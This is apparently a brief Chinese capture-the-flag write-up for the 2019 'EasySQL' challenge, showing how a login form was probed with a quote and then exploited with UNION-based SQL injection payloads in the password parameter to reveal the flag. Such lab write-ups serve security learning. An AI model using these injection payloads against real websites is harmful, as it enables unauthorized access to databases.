## [极客大挑战 2019]EasySQL

![image-20240815100640223](https://gitee.com/bx33661/image/raw/master/path/image-20240815100640223.png)

由于根据题目名称可以知道，是sql注入题，我们这里尝试使用`1'`测试回显情况，发现可以注入

1. `?username=1&password=1' order by 6%23`
2. `?username=1&password=1' order by 3%23`
3. `?username=1&password=1' union select 1,2,3%23`

最后得到--==flag==

![image-20240815101232079](https://gitee.com/bx33661/image/raw/master/path/image-20240815101232079.png)